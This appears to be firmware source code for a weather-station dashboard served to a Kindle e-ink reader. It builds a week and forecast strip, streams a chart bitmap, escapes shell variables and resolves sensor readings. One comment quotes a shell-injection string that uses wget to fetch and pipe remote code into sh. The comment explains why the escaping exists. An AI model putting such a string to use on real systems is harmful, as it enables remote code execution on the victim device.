// was empty at 695 of 800 px, and answers the question an e-ink panel on a
// shelf is otherwise bad at: what day is it.
//
// Monday-first, the local convention. tm_wday counts from Sunday, so the
// shift is (wday + 6) % 7 rather than wday itself — getting that backwards
// puts today in the wrong column on Sundays only, which is exactly the sort
// of bug that survives a casual look.
static void appendWeek(String& out, uint32_t now, bool rule = true) {
    if (now < 1000000000u) return;

    const time_t t = (time_t)now;
    struct tm tmv;
    if (localtime_r(&t, &tmv) == nullptr) return;

    const int todayIdx = (tmv.tm_wday + 6) % 7;      // 0 = Monday

    // The month, set as a section heading like the two above it. The day
    // numbers alone say which day it is but not which month, which the
    // masthead used to answer.
    //
    // A week can straddle two months, and then one name is a lie about half
    // the row — so name both. Taken from Monday and Sunday rather than from
    // today, since today may be either side of the boundary.
    struct tm mv, sv;
    const time_t monday = t - (time_t)todayIdx * 86400;
    const time_t sunday = monday + 6 * 86400;
    if (localtime_r(&monday, &mv) != nullptr && localtime_r(&sunday, &sv) != nullptr) {
        // Beside the clock on the landscape page, with nothing over it to
        // separate it from.
        if (rule) out += F("<div class=\"rule\"></div>");
        out += F("<div class=\"sec sec-wk\">");
        out += kdMonth(mv.tm_mon);
        if (sv.tm_mon != mv.tm_mon) {
            out += F(" &ndash; ");
            out += kdMonth(sv.tm_mon);
        }
        out += F("</div>");
    } else if (rule) {
        out += F("<div class=\"rule\"></div>");
    }

    // Walk back to Monday in whole days. Doing it on the epoch rather than on
    // tm_mday keeps month and year ends correct for free.
    out += F("<table class=\"wk\"><tr>");
    for (int i = 0; i < 7; i++) {
        const time_t day = t + (time_t)(i - todayIdx) * 86400;
        struct tm dv;
        if (localtime_r(&day, &dv) == nullptr) continue;
        out += F("<td class=\"");
        if (i == todayIdx)   out += F("wd wd-now");
        else if (i >= 5)     out += F("wd wd-we");   // Sat, Sun
        else                 out += F("wd");
        out += F("\"><div class=\"wd-n\">");
        out += kdWeekdayShort(i);
        out += F("</div><div class=\"wd-d\">");
        out += dv.tm_mday;
        out += F("</div></td>");
    }
    out += F("</tr></table>");
}

/// Whether the week strip holds the forecast, and where today is in `fc`'s
/// days: -1 for the calendar. The reader asked for it, the strip is on the
/// page, and there is a fresh forecast whose first or second day is today —
/// the second once a forecast fetched before midnight is read after it, when
/// its first day is yesterday. Otherwise it is the calendar, as it always was:
/// a strip of empty cells would say less than the dates do.
#ifdef MODULE_FORECAST_ENABLED
static int kdWeekFcStart(const KindleConfig& k, const ForecastModule::Data& fc,
                         uint32_t now) {
    if (!kdWeekForecast(k) || !(k.showFlags & KSHOW_WEEK)) return -1;
    if (!fc.valid || !fc.fetchedAt || now < fc.fetchedAt ||
        now - fc.fetchedAt > KD_FORECAST_STALE_S) return -1;
    const time_t t = (time_t)now;
    struct tm tmv;
    if (now < 1000000000u || localtime_r(&t, &tmv) == nullptr) return -1;
    for (int i = 0; i < 2; i++)
        if (fc.days[i].valid && fc.days[i].wday == tmv.tm_wday) return i;
    return -1;
}

/// The same, read off a snapshot of its own — for the outlook band, which
/// steps through the hours whenever the strip holds the days.
static bool kdWeekFcOn(const KindleConfig& k, uint32_t now) {
    return kdWeekFcStart(k, forecastModule.snapshot(), now) >= 0;
}

/// The week strip holding the forecast: tomorrow and the six days after it,
/// each cell its weekday, the condition and the high over the low. Not today:
/// the headline above already says what today is doing, and a cell repeating
/// it was a day of outlook given away. So no cell is marked either; the
/// weekend is shaded darker, as in the calendar. The cells
/// are one height with the calendar's, month heading included, so nothing
/// else on the page moves when the reader switches between them.
static void appendWeekFc(String& out, const ForecastModule::Data& fc, int start,
                         uint32_t now, bool rule) {
    static const ForecastModule::Period none;
    // A day the provider did not reach still carries its weekday, as on the
    // panel; the name is worked out from today when there is one.
    const time_t t = (time_t)now;
    struct tm tmv;
    const bool haveDay = now > 1000000000u && localtime_r(&t, &tmv) != nullptr;
    if (rule) out += F("<div class=\"rule\"></div>");
    out += F("<table class=\"wk wf\"><tr>");
    for (int i = 0; i < ForecastModule::WEEK_N; i++) {
        const int di = start + 1 + i;              // tomorrow onwards
        const ForecastModule::Period& d =
            di < ForecastModule::DAYS_N ? fc.days[di] : none;
        // The weekend darker, as in the calendar: by the day's own weekday,
        // or worked out from today for a day the provider did not reach.
        const int wd = d.valid && d.wday >= 0 ? d.wday
                     : (haveDay ? (tmv.tm_wday + i + 1) % 7 : -1);
        out += (wd == 0 || wd == 6) ? F("<td class=\"wd wd-we\">") : F("<td class=\"wd\">");
        out += F("<div class=\"wd-n\">");
        out += d.valid ? forecastPeriodLabel(d)
                       : (haveDay ? kdWeekdayAhead(tmv.tm_wday, i + 1) : "");
        out += F("</div>");
        if (d.valid) {
            appendWeatherIcon(out, d.code, kdPx(30));
            out += F("<div class=\"wf-t\">");
            out += (int)lroundf(d.tempC);
            out += F("&deg;");
            if (isfinite(d.lowC)) {
                out += F("<span class=\"dim\">/");
                out += (int)lroundf(d.lowC);
                out += F("&deg;</span>");
            }
            out += F("</div>");
        }
        out += F("</td>");
    }
    out += F("</tr></table>");
}
#endif

/// The week strip, whichever it holds.
static void appendWeekStrip(String& out, const KindleConfig& skin, uint32_t now,
                            bool rule = true) {
    #ifdef MODULE_FORECAST_ENABLED
    {
        const ForecastModule::Data fc = forecastModule.snapshot();
        const int start = kdWeekFcStart(skin, fc, now);
        if (start >= 0) { appendWeekFc(out, fc, start, now, rule); return; }
    }
    #endif
    appendWeek(out, now, rule);
}

// ---------------------------------------------------------------------------
// The page
// ---------------------------------------------------------------------------
// Set like a printed almanac rather than a screen UI, because the medium is
// paper in every way that matters: reflective, static, greyscale, redrawn in
// full or not at all. So — rules instead of boxes, letterspaced small caps
// instead of chips, and the reader's own serif faces (Bookerly and Caecilia
// ship on the device) instead of a webfont that would cost bytes to render
// worse.
//
// Nothing here uses flexbox, grid, CSS variables or calc(). A current PQ94WIF
// on firmware 5.16.4 or later would support them; an older one would not, and
// tables with literal pixel values render the same on both. See the header for
// why that trade is made in favour of the old browser.
// The chart itself lives in KindleChartBmp.h — Arduino-free, so the host
// tests can render it and check the bytes. Only the serving is below.

void handleKindleGraph(AsyncWebServerRequest* req) {
    const KindleConfig skin = config.kindle;
    // As wide as the reader's layout left the chart, when it says: the
    // landscape page's is beside the readings. See LY_GR_W.
    uint16_t askW = 0;
    if (const String* arg = queryArg(req, "w")) {
        const long v = arg->toInt();
        if (v > 0 && v < 4000) askW = (uint16_t)v;
    }
    uint16_t W = ChartBmp::clampW(askW, skin.fbinkResW);
    // As tall as the reader's layout left the chart, when it says — see
    // LY_GR_H in /kindle/data. A reader that does not say gets the fixed
    // image it has always been sent.
    uint16_t askH = 0;
    if (const String* arg = queryArg(req, "h")) {
        const long v = arg->toInt();
        if (v > 0 && v < 4000) askH = (uint16_t)v;
    }
    uint16_t H = ChartBmp::clampH(askH, skin.fbinkResW);
    // The wall page's line behind the headline: as large as the headline's
    // row, which is nothing like the chart's shape — see ChartBmpCtx::lineOnly.
    // Its width is in the chart's range; its height is far less than the
    // chart's least, and the rows are streamed, so any height will do.
    const bool line = queryArg(req, "line") != nullptr;
    // A grid place's line (&z=g1) is a cell wide, far under the chart's least.
    if (line) { H = askH < 16 ? 16 : askH; if (askW) W = (askW < 64 ? 64 : askW > 1000 ? 1000 : askW) & ~7u; }
    uint8_t zi = KZ_COUNT;
    if (const String* arg = queryArg(req, "z")) zi = kdZoneFromKey(arg->c_str());
    const KindleSlot* zs = zi < KZ_COUNT && kdSlots().z[zi].used() ? &kdSlots().z[zi] : nullptr;

    // A shared_ptr, AND THAT IS THE FIX, not a tidier spelling of the same
    // thing. The previous version held raw pointers and deleted them only on
    // the branch that runs when the last byte goes out, so a client that
    // disconnected mid-image leaked the context and the stream state — every
    // time. The client is a ten-year-old reader on wifi fetching this on a
    // timer, which is the population most likely to drop a connection, and
    // ~3 KB a go against this device's free heap is not many aborted requests
    // before it stops serving anything at all. The response object owns the
    // std::function; destroying it — on completion OR on abort — releases this.
    auto st = std::shared_ptr<ChartBmpReader>(new(std::nothrow) ChartBmpReader);
    if (!st) { req->send(503, "text/plain", "out of memory"); return; }

    const uint32_t now = (uint32_t)time(nullptr);
    st->ctx.haveOut = zs ? trendRing.series(zs->sensorId, zs->metric, now, st->ctx.tOut)
                         : trendRing.series(outdoorSensorId(), "temperature", now, st->ctx.tOut);
    st->ctx.haveIn  = trendRing.series(indoorSensorId(),  "temperature", now, st->ctx.tIn);
    // The same two hours in five minutes the payload's axis labels describe.
    if (!zs && kdChartWantsFine(st->ctx.tOut, st->ctx.tIn, st->ctx.haveOut, st->ctx.haveIn))
        kdChartUseFine(now, st->ctx.tOut, st->ctx.tIn, st->ctx.haveOut, st->ctx.haveIn);
    st->ctx.lineOnly = line;
    st->ctx.lineInv  = line && queryArg(req, "inv");
    st->ctx.init(W, H);
    st->begin();

    // A LENGTHED RESPONSE, NOT A CHUNKED ONE. The size is known before the
    // first byte, and the previous version sent it as Content-Length ON TOP OF
    // Transfer-Encoding: chunked — two framings that contradict each other,
    // where the length given was the unchunked size. A client that believed the
    // header read a truncated BMP; a proxy is entitled to reject the message
    // outright. Announcing the length also lets the reader show progress and
    // skips the per-chunk framing on a slow link.
    AsyncWebServerResponse* resp = req->beginResponse(
        "image/bmp", st->total,
        [st](uint8_t* buffer, size_t maxLen, size_t /*index*/) -> size_t {
            return st->read(buffer, maxLen);
        });

    // beginResponse allocates, and this device runs close enough to its heap
    // limit that "it returned null" is a real branch rather than a formality.
    if (!resp) { req->send(503, "text/plain", "out of memory"); return; }
    resp->addHeader("Cache-Control", "no-cache");
    req->send(resp);
}

// ---------------------------------------------------------------------------
// The page
// ---------------------------------------------------------------------------


// Emit one KEY="value" line with the value escaped for a POSIX shell.
//
// THE CONSUMER OF THIS FILE IS `.` — kindle/update_dash.sh sources it, as root,
// on a device with no security model to speak of. So every byte on the right of
// the `=` is code unless something makes it data, and one of the values is the
// forecast provider's free-text summary: an upstream API's string, or anything
// that can answer for it on an unencrypted link. A summary of
//
//     "; wget -O - http://x/y | sh; #
//
// is a shell command on the reader, not a weather description.
//
// Backslash-escaping the four characters that keep their meaning inside double
// quotes ("  \  $  `) makes the value inert; control characters are dropped
// outright because a newline would end the assignment whatever is escaped, and
// none of them belong in a label.
static void kdShellVar(AsyncResponseStream* s, const char* key, const char* val) {
    s->print(key);
    s->print("=\"");
    for (const char* p = val; p && *p; p++) {
        const unsigned char c = (unsigned char)*p;
        if (c < 0x20 || c == 0x7F) continue;
        if (c == '"' || c == '\\' || c == '$' || c == '`') s->print('\\');
        s->write(c);
    }
    s->print("\"\n");
}

/// The same, for the indexed keys (FC0_LABEL, WK3_NAME…).
/// kdShellVar(), but uppercased first.
///
/// FOR EVERY STRING THE PAGE SETS `text-transform:uppercase` ON. That CSS is
/// the only reason the tables in DashboardStrings.h are lower case, and the
/// panel has no CSS — so it drew "Навън" and "Mon" where the browser drew
/// "НАВЪН" and "MON", from one setting on one device, and most visibly on the
/// two strings a reader typed themselves. The reader's busybox cannot fix it:
/// `tr a-z A-Z` is ASCII-only, which would uppercase "Pressure" and leave
/// "Налягане" exactly as it was.
///
/// 96 bytes because a label is 24 (KindleSlot::label) and Cyrillic is two bytes
/// a letter; kdUpperUtf8() truncates on a character boundary rather than inside
/// one, so a longer string loses whole letters instead of gaining a box glyph.
static void kdShellVarUpper(AsyncResponseStream* s, const char* key,
                            const char* val) {
    char up[96];
    kdUpperUtf8(up, sizeof(up), val);
    kdShellVar(s, key, up);
}

static void kdShellVarN(AsyncResponseStream* s, const char* fmt, int i, const char* val) {
    char key[24];
    snprintf(key, sizeof(key), fmt, i);
    kdShellVar(s, key, val);
}

/// KEY="G1 G2…": the places in `used`, upper case, in order.
static void kdShellZoneList(AsyncResponseStream* s, const char* key,
                            const uint8_t* used, int n) {
    s->print(key);
    s->print("=\"");
    for (int i = 0; i < n; i++) {
        if (i) s->print(' ');
        for (const char* c = kdZoneKey(used[i]); *c; c++)
            s->print((char)((*c >= 'a' && *c <= 'z') ? *c - 32 : *c));
    }
    s->print("\"\n");
}

/// KEY=<number> and a newline, unquoted: the same bytes a printf with "%d"
/// wrote, without a format string per key and a vsnprintf behind each one.
static void kdShellInt(AsyncResponseStream* s, const char* key, long v) {
    s->print(key);
    s->print('=');
    s->print(v);
    s->print('\n');
}

/// The same for the unsigned values (%u, %lu) — advance widths, epoch seconds.
static void kdShellUint(AsyncResponseStream* s, const char* key, unsigned long v) {
    s->print(key);
    s->print('=');
    s->print(v);
    s->print('\n');
}

// ---------------------------------------------------------------------------
// The eleven places
// ---------------------------------------------------------------------------
/// One resolved place: the reading, formatted, with the label, unit and
/// tendency it will be drawn with. Shared by both renderers so a value cannot
/// be rounded one way on the reader and another in a browser.
struct KdResolved {
    char        text[24];   ///< the number, already at its decimals

    /// A BUFFER, NOT A POINTER, and that is the whole point of it.
    ///
    /// The unit usually comes from kdMetricStyles() and is a string literal, but
    /// for a metric the table does not list — or lists with a null unit, which
    /// is wind, wind_speed, uva, uvb and flow_rate — kdSlotUnit() hands back the
    /// unit the SENSOR reported, and that lives in the `Latest` the resolve loop
    /// declared for one iteration. Storing the pointer meant both renderers read
    /// a popped stack frame: the reading would print with whatever happened to
    /// be at that address, which on a good day is the next place's unit.
    char        unit[12];   ///< sized to match Latest::unit

    const char* label;      ///< into KindleZones or a table literal — both outlive us
    const char* arrow;      ///< a literal from KD_TEND_ARROWS[]
    bool        ok;
    uint32_t    ts;
};

// kdAdvanceMille() — how wide a string comes out, in thousandths of the type
// size — lives in KindleFlow.h now, beside the layout that sizes each reading
// by it.

/// Resolve all eleven places against the live readings.
///
/// ONE CALL, USED BY BOTH RENDERERS. The FBInk page and the HTML one differ in
/// how they DRAW a place and not at all in what is in it, so the visibility
/// rule, the unit conversion, the rounding and the tendency happen here once.
/// Two copies of this would be two chances to show a different number depending
/// on which screen you were looking at.
static void kdResolveZones(const KindleConfig& skin, KdResolved out[KZ_COUNT]) {
    const KindleZones& zones = kdSlots();

    for (int i = 0; i < KZ_COUNT; i++) {
        out[i] = KdResolved{};      // zeroes unit[], which is an empty string
        out[i].label = "";
        out[i].arrow = "";

        const KindleSlot& sl = zones.z[i];
        if (!sl.used()) continue;

        const Latest rd = slotReading(sl);
        if (!rd.ok) continue;

        float       v    = rd.value;
        const char* unit = rd.unit;
        int         dec  = kdSlotDecimals(sl);

        // Pressure is the one metric the reader can re-unit, so it is the one
        // whose stored hPa is not what gets printed.
        if (strcmp(sl.metric, "pressure") == 0) {
            v    = kdPressureValue(rd.value, skin.pressureUnit);
            unit = kdPressureUnitLabel(skin.pressureUnit);
            dec  = kdPressureDecimals(skin.pressureUnit);
        } else if (strcmp(sl.metric, "temperature") == 0) {
            // The temperature decimals control predates the places and still
            // wins: it is the setting people actually turn, and having it apply
            // to the headline but not to a second temperature would be a
            // puzzle.
            dec = skin.tempDecimals;
        }

        snprintf(out[i].text, sizeof(out[i].text), "%.*f", dec, (double)v);
        // The display unit, which is not always the sensor's: a temperature
        // wants the degree sign the page has always shown, not the pipeline's
        // machine-readable "C". Pressure is the exception — it was re-united
        // above and carries its own label.
        if (strcmp(sl.metric, "pressure") != 0) unit = kdSlotUnit(sl, unit);
        if ((sl.flags & KSLOTF_UNIT) && unit) {
            strncpy(out[i].unit, unit, sizeof(out[i].unit) - 1);
            out[i].unit[sizeof(out[i].unit) - 1] = '\0';
        }
        out[i].label = kdSlotLabel(sl);
        out[i].ok    = true;
        out[i].ts    = rd.ts;

        // The three-hour tendency, for the place that asked for one. Pressure
        // is the only metric it is defined for — a rising AQI is a number going
        // up, a rising barometer is a forecast — so the flag is quietly ignored
        // elsewhere rather than drawing an arrow that means nothing.
        if ((sl.flags & KSLOTF_TREND) && (skin.showFlags & KSHOW_TENDENCY) &&
            strcmp(sl.metric, "pressure") == 0) {
            TrendRing::Hour h[TrendRing::HOURS];
            if (trendRing.series(sl.sensorId, "pressure",
                                 (uint32_t)time(nullptr), h)) {
                const Tendency t = pressureTendency(h);
                if (t.have) out[i].arrow = KD_TEND_ARROWS[t.idx];
            }
        }
    }
}

/// Which places have something to draw — the input to the closing-up rules.
static void kdZoneVisibility(const KdResolved* res, bool visible[KZ_COUNT]) {
    for (int i = 0; i < KZ_COUNT; i++) visible[i] = res[i].ok;
}

/// The line under the headline: the hero metric's 24-hour low-to-high, and how
/// old its reading is.
///
/// Built here rather than in each renderer because it is one sentence in the
/// page's language, and two renderers composing it separately is two places for
/// the wording, the unit and the rounding to drift apart.
static void kdSubLine(char* buf, size_t n, const KindleConfig& skin,
                      const KdResolved& hero, uint32_t now) {
    buf[0] = '\0';
    const KindleZones& zones = kdSlots();
    const KindleSlot&  sl    = zones.z[KZ_HERO];
    size_t at = 0;

    if ((skin.showFlags & KSHOW_RANGE) && sl.used()) {
        TrendRing::Hour h[TrendRing::HOURS];
        float mn, mx;
        if (trendRing.series(sl.sensorId, sl.metric, now, h) &&
            windowExtremes(h, mn, mx)) {
            const int dec = (strcmp(sl.metric, "temperature") == 0)
                          ? skin.tempDecimals : kdSlotDecimals(sl);
            at += snprintf(buf + at, n - at, "%.*f %s %.*f%s",
                           dec, (double)mn, KD_T("to", "до"),
                           dec, (double)mx, hero.unit ? hero.unit : "");
            if (at >= n) { buf[n - 1] = '\0'; return; }
        }
    }

    // The age, and only when it is worth saying. A reading a minute old is
    // current; one an hour old is the thing the reader needs to know about.
    if ((sl.flags & KSLOTF_AGE) && hero.ok && hero.ts && now > hero.ts) {
        const uint32_t mins = (now - hero.ts) / 60u;
        if (mins >= 2) {
            const char* sep = at ? "  ·  " : "";
            if (mins < 60)
                snprintf(buf + at, n - at, "%s%u%s", sep, (unsigned)mins,
                         KD_T(" min old", " мин"));
            else
                snprintf(buf + at, n - at, "%s%u%s", sep, (unsigned)(mins / 60),
                         KD_T(" h old", " ч"));
        }
    }
    buf[n - 1] = '\0';
}

// ---------------------------------------------------------------------------
// The shell renderer's half
// ---------------------------------------------------------------------------
/// Emit the eleven places for update_dash.sh.
///
/// The keys are named after the places rather than numbered, so the script says
/// `$Z_HERO_VALUE` and a person reading it knows where that lands. GRID_ZONES
/// and IN_ZONES carry the closing-up: they list only the places that survived,
/// in order, so the script iterates a list instead of re-deriving the rule.
// ---------------------------------------------------------------------------
// The layout, for what is on the page
// ---------------------------------------------------------------------------
/// The widest one place can print, for the layout to size it by — its reading
/// widened to the most digits its metric reaches, with its unit, and with the
/// tendency arrow if it is a place that draws one. The arrow counts whether or
/// not there is a tendency yet: it appears three hours after a restart, and a
/// layout that made room for it only then would shrink the grid at that hour.
///
/// `firstIn`: the indoor row's first place, which an indoor temperature sizes
/// without the reserved minus — see kdFlowFirstInAdvance().
///
/// `capArrow`: the wall page's grid, whose arrow goes on the caption's line
/// with the unit (kdWallUnits()), and so takes nothing from the figures.
static uint16_t kdPlaceAdvance(const KindleConfig& skin, const KindleSlot& sl,
                               const KdResolved& r, bool firstIn = false,
                               bool capArrow = false) {
    const bool arrow = !capArrow && (sl.flags & KSLOTF_TREND) &&
                       (skin.showFlags & KSHOW_TENDENCY) && strcmp(sl.metric, "pressure") == 0;
    return firstIn ? kdFlowFirstInAdvance(sl.metric, r.text, r.unit, arrow)
                   : kdFlowWorstAdvance(sl.metric, r.text, r.unit, arrow);
}

/// The value beside the headline as it prints, with its unit and the arrow
/// kdPlaceAdvance() counts; `sized` for the two figures it is laid out for.
static uint16_t kdHeadAdvance(const KindleConfig& skin, const KindleSlot& sl,
                              const KdResolved& r, bool sized = false) {
    const bool arrow = (sl.flags & KSLOTF_TREND) && (skin.showFlags & KSHOW_TENDENCY) &&
                       strcmp(sl.metric, "pressure") == 0;
    return (uint16_t)(sized ? kdFlowPairAdvance(sl.metric, r.text, r.unit, arrow)
                            : kdFlowFieldAdvance(r.text, r.unit, arrow));
}

/// Where everything goes on this render. ONE CALL, USED BY BOTH RENDERERS, for
/// the reason the places are resolved once: the browser page and the panel
/// must not disagree about which cell is on which row or how big it is.
///
/// `res` is the places as kdResolveZones() left them; `standalone` is whether
/// the forecast band is on the page; `haveSub` whether the line under the
/// headline has anything in it; `html` whether it is for the browser page.
static KdFlow kdFlowFor(const KindleConfig& skin, const KdResolved res[KZ_COUNT],
                        bool standalone, bool haveSub, bool html, bool land,
                        bool inCol, bool wall) {
    const KindleZones& zones = kdSlots();
    bool visible[KZ_COUNT];
    kdZoneVisibility(res, visible);

    KdFlowIn in;
    in.chart    = (skin.showFlags & KSHOW_CHART) != 0;
    in.week     = (skin.showFlags & KSHOW_WEEK) != 0;
    in.forecast = !standalone;
    in.sub      = haveSub;
    in.clock    = (kdShowMask(skin) & KSHOW_CLOCK) != 0;
    in.land     = land;
    in.outPct   = (uint8_t)kdOutSizePct(skin);
    in.inPct    = (uint8_t)kdInSizePct(skin);
    in.inColOk  = inCol;
    in.wall     = wall && !land;
    // The headline and the value beside it, so the flow can fit the two on
    // one line — as the page draws them: the second only when it is switched
    // on and has a reading. The headline BY WHAT IT PRINTS; the second by
    // that and by the two figures it is sized for (kdFlowPairAdvance()), so
    // it keeps its size and the headline takes what is left — see
    // kdFlowHeadFit().
    if (zones.z[KZ_HERO].used() && res[KZ_HERO].ok)
        in.heroAdv = kdHeadAdvance(skin, zones.z[KZ_HERO], res[KZ_HERO]);
    if ((skin.showFlags & KSHOW_BIG) && zones.z[KZ_BIG].used() && res[KZ_BIG].ok) {
        in.bigAdv    = kdHeadAdvance(skin, zones.z[KZ_BIG], res[KZ_BIG]);
        in.bigFitAdv = kdHeadAdvance(skin, zones.z[KZ_BIG], res[KZ_BIG], true);
    }

    uint8_t used[KZ_GRID_COUNT];
    const int n = (skin.showFlags & KSHOW_GRID) ? kdGridUsed(zones, visible, used) : 0;
    in.nGrid = (uint8_t)n;
    for (int i = 0; i < n; i++)
        in.gridAdv[i] = kdPlaceAdvance(skin, zones.z[used[i]], res[used[i]], false, in.wall);

    uint8_t inUsed[KZ_INDOOR_COUNT];
    const int m = (skin.showFlags & KSHOW_INSIDE) ? kdIndoorUsed(zones, visible, inUsed) : 0;
    in.nIn = (uint8_t)m;
    // The first by kdFlowFirstInAdvance(): closer to what it prints, like the
    // headline across the rule.
    for (int i = 0; i < m; i++)
        in.inAdv[i] = kdPlaceAdvance(skin, zones.z[inUsed[i]], res[inUsed[i]], i == 0);

    return html ? kdFlowComputeHtml(in) : kdFlowCompute(in);
}

/// The places and the layout, resolved once for a render. Both handlers need
/// the same three things in the same order, and the layout cannot be worked out
/// before the places are.
struct KdRender {
    KdResolved res[KZ_COUNT];
    char       sub[64];
    KdFlow     flow;
    bool       chartFine = false;   ///< the first two hours — kdChartWantsFine()
    /// The wall page's grid units, moved off the value onto its caption —
    /// see kdWallUnits(). Empty for a place whose unit stayed.
    char       capUnit[KZ_GRID_COUNT][sizeof(KdResolved::unit)] = {};
    /// The wall page's outdoor line behind the headline: the chart's switch,
    /// on a page that has no chart (kdWallSkin()).
    bool       heroLine = false;
};

/// THE UNIT ON THE CAPTION'S LINE on the wall page's grid, "НАЛЯГ / hPa", so
/// the cell's width goes to the figures: "1010 hPa" and "14 µg/m³" set two to
/// a row in half a 352 px column came out at 47 px. A degree or a per cent
/// sign stays on its number — it is narrow, and "РОСА / °" reads as nothing.
static bool kdUnitToCaption(const char* unit) {
    return unit[0] && strncmp(unit, "\xC2\xB0", 2) != 0 && strcmp(unit, "%") != 0;
}

static void kdWallUnits(KdRender& r) {
    for (int i = 0; i < KZ_GRID_COUNT; i++) {
        KdResolved& z = r.res[KZ_G1 + i];
        r.capUnit[i][0] = '\0';
        if (!kdUnitToCaption(z.unit)) continue;
        memcpy(r.capUnit[i], z.unit, sizeof(z.unit));
        z.unit[0] = '\0';
    }
}

#ifdef MODULE_FORECAST_ENABLED
/// The wall page's high and low as large as what they print lets them be:
/// the layout sized them for the widest, "-10°/-20°", and "14°/3°" is half
/// as wide. Up to kdWallFcTempMax(), never below the layout's size.
static void kdWallFcFit(KdFlow& f) {
    const ForecastModule::Data d = forecastModule.snapshot();
    // No isfinite(): a missing high or low is not drawn at all, so whatever
    // size this works out for it goes unused.
    if (!d.valid) return;
    char t[24];
    snprintf(t, sizeof(t), "%d\xC2\xB0/%d\xC2\xB0", (int)lroundf(d.highC), (int)lroundf(d.lowC));
    const unsigned adv = kdFigAdvance(t);
    const int fw = KDF_WALL_X1 - f.fcTempX;
    if (!adv) return;
    const int sz = kdfMin(kdWallFcTempMax(f), (int)(fw * 1000u / adv));
    if (sz > f.fcTempSz) f.fcTempSz = (uint8_t)sz;
}
#endif

/// `inCol`: the renderer knows the two-column indoor row — the browser page
/// always, the FBInk panel when its request says ?col=1. `wall`: the wall page,
/// from kdWallFor().
static void kdRenderBegin(KdRender& r, const KindleConfig& skin, uint32_t now,
                          bool standalone, bool html, bool land, bool inCol = true,
                          bool wall = false) {
    kdResolveZones(skin, r.res);
    kdSubLine(r.sub, sizeof(r.sub), skin, r.res[KZ_HERO], now);
    // Before the layout, which then sizes the grid by its figures alone.
    if (wall && !land) kdWallUnits(r);
    r.flow = kdFlowFor(skin, r.res, standalone, r.sub[0] != '\0', html, land, inCol, wall);
#ifdef MODULE_FORECAST_ENABLED
    if (wall && !land) kdWallFcFit(r.flow);
#endif
}

/// Whether this render is the wall page (KPAGE_WALL): chosen for this
/// renderer — `style` is KindleConfig::pageStyle for the FBInk panel and
/// ::webStyle for the browser page, which are set apart — upright, and for a
/// renderer that knows how to draw it: the browser page always, the panel
/// when its script says ?wall=1. A script from before it gets the desk page it
/// can draw, rather than keys it would drop.
static bool kdWallFor(uint8_t style, uint8_t rot, bool knows) {
    return style == KPAGE_WALL && !kdRotLandscape(rot) && knows;
}

/// The reader's choices as the wall page reads them, on the render's own copy:
/// no chart and no week strip, whatever their switches say — the page has no
/// room for either, and a line one pixel wide does not read across a room —
/// and, unless the rules have been set, the heaviest black ones.
static void kdWallSkin(KindleConfig& skin) {
    skin.showFlags &= (uint16_t)~(KSHOW_CHART | KSHOW_WEEK);
    if (!skin.rules) skin.rules = kdRulesPack(KRULE_THICK, KRULE_BLACK, KRULE_SOLID);
}

static void emitZones(AsyncResponseStream* s, const KindleConfig& skin,
                      KdRender& rd) {
    // IN PLACE, not a copy: seven hundred bytes of places on the web server's
    // stack is enough once. Nothing reads them after this but the layout keys,
    // which were worked out before KSHOW_BIG is applied below and do not
    // depend on the second headline value.
    KdResolved* res = rd.res;

    bool visible[KZ_COUNT];
    kdZoneVisibility(res, visible);

    // KSHOW_BIG APPLIED HERE, where the grid's and the indoor row's flags are
    // already applied. The page tests it before drawing the slash and the
    // second headline value; nothing tested it on this side, so switching the
    // second value off left the browser page with one number and the panel
    // with two. A place that is switched off is a place with no reading, which
    // is a shape both renderers already know what to do with — the reader
    // draws nothing for an empty Z_BIG_VALUE.
    if (!(skin.showFlags & KSHOW_BIG)) {
        res[KZ_BIG].ok      = false;
        res[KZ_BIG].text[0] = '\0';
        res[KZ_BIG].unit[0] = '\0';
        res[KZ_BIG].arrow   = "";
    }

    const KindleZones& zones = kdSlots();

    // THE SECOND HEADLINE VALUE IS SUBORDINATE, and the page says so in one
    // line of CSS the panel cannot see: `.v2{color:#444}`, applying whenever
    // the place has not been given an ink of its own (an .ink-* class is
    // emitted later in the sheet and wins when there is one). The panel read
    // only the ink and so drew it in full black, level with the headline it is
    // meant to sit under — "32.4 / 71" as two equal numbers instead of a
    // reading and its companion.
    const bool bigDefaultInk = (zones.z[KZ_BIG].ink != KINK_DARK &&
                                zones.z[KZ_BIG].ink != KINK_MID &&
                                zones.z[KZ_BIG].ink != KINK_LIGHT);

    // Uppercased, because .lab is `text-transform:uppercase` on the page and
    // the panel has no CSS. See kdShellVarUpper().
    kdShellVarUpper(s, "Z_GROUP_OUT", kdGroupOutLabel(zones));
    kdShellVarUpper(s, "Z_GROUP_IN",  kdGroupInLabel(zones));
    {   // as printed, for the wall page, which centres it over its column
        char lup[48];
        kdUpperUtf8(lup, sizeof(lup), kdGroupInLabel(zones));
        kdShellUint(s, "Z_GROUP_IN_ADVW", kdAdvanceMille(lup));
    }

    kdShellVar(s, "Z_SUB", rd.sub);
    // Its width, for centring it under a headline with nothing beside it.
    kdShellUint(s, "Z_SUB_ADVW", kdAdvanceMille(rd.sub));

    char key[24];
    for (int i = 0; i < KZ_COUNT; i++) {
        // Upper case, because the shell reads these as variable names and the
        // rest of the protocol is upper case.
        const char* k = kdZoneKey((uint8_t)i);
        char up[8];
        size_t j = 0;
        for (; k[j] && j < sizeof(up) - 1; j++)
            up[j] = (k[j] >= 'a' && k[j] <= 'z') ? (char)(k[j] - 32) : k[j];
        up[j] = '\0';

        snprintf(key, sizeof(key), "Z_%s_VALUE", up);
        kdShellVar(s, key, res[i].ok ? res[i].text : "");
        snprintf(key, sizeof(key), "Z_%s_UNIT", up);
        kdShellVar(s, key, res[i].unit);
        snprintf(key, sizeof(key), "Z_%s_LABEL", up);
        kdShellVarUpper(s, key, res[i].label);
        snprintf(key, sizeof(key), "Z_%s_ARROW", up);
        kdShellVar(s, key, res[i].arrow);

        // Every value bold on the wall page, which is read from across a room.
        s->printf("Z_%s_BOLD=%d\n", up,
                  ((zones.z[i].flags & KSLOTF_BOLD) || rd.flow.wall) ? 1 : 0);
        // Extra bold, white on black, and the place's own 24 h line: only
        // when set, as the script forgets all three before each payload.
        if (zones.z[i].flags & KSLOTF_HEAVY) s->printf("Z_%s_HEAVY=1\n", up);
        if (zones.z[i].flags & KSLOTF_INV)   s->printf("Z_%s_INV=1\n", up);
        if (zones.z[i].flags & KSLOTF_LINE)  s->printf("Z_%s_LINE=1\n", up);
        // The colour NAME, not the level: the shell hands it straight to
        // FBInk's -C, and translating a number there would be a second copy of
        // a mapping that already lives in KindleSlots.h.
        snprintf(key, sizeof(key), "Z_%s_INK", up);
